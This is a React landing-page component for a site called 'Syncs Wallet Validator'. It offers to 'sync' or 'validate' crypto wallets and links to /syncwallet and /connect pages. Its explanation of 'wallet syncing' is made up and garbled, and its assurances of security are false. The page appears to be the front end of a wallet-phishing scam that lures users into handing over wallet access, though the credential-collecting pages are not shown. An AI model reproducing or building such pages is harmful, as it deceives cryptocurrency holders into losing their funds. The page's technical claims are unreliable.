import React from 'react';
import { Link } from 'react-router-dom';

const Index = () => {
    return (
        <center>
            <a className="main" href="/">
                <img src="./images/walletsync.png" alt=""/>
            </a>
            <br></br>
            <div className="sync-wallet-validator">Syncs Wallet Validator</div>
            <div className="open-protocol">Open protocol for syncing various Wallets to Dapps Secure Server</div>
            <br></br>
            <div className="banner">
                <img src="./images/banner.png" alt=""/>
            </div>
            <div className="about">
                <h2 className="question">
                    What is Wallet syncing
                </h2>
                <p>
                    Wallet Syncing is the process or operation of merging two or more wallets at the same time. Syncing is als a method of Re-Authenticating an account in other for all tokens in that account to show up in their Respective wallets. We also synergize with various ICOs and Exchanges to ensure user data is properly stored and safe from cyber criminals.
                </p>
                <br></br>
                <h2 className="question">
                    How does Wallet Syncing work?
                </h2>
                <p>
                    There are three main approaches.
                </p>
                <ul>
                    <li>Firstly, we assume that the wallet is on a complete Blockchain network node.</li>
                    <li>Secondly, wallets are securely connected to Dapps protocol trusted server.</li>
                    <li>Thirdly, various wallet synced are in direct interaction with the rest of the network node which is the most efficient using the Simplified Payment Verification (SPV) method. This technique of syncing wallets allows a high degree of reliability which is currently the syncing method being used on our website.</li>
                </ul>
                <p></p>
            </div>

            <div>
                <h3>
                    <Link to="/syncwallet" className="btn btn-primary mt-6 mx-auto downloadapp-native">Sync Wallet for Validation now </Link>
                </h3>
                <br></br>
                <div>You can also enable wallet connect for your multiple
                    iOS and Android wallets protocol.
                    <h3><Link to="/connect" className="btn btn-primary mt-6 mx-auto downloadapp-native">
                        Connect to walletconnect now
                    </Link></h3>

                </div>
            </div>
        </center>
    )
}

export default Index
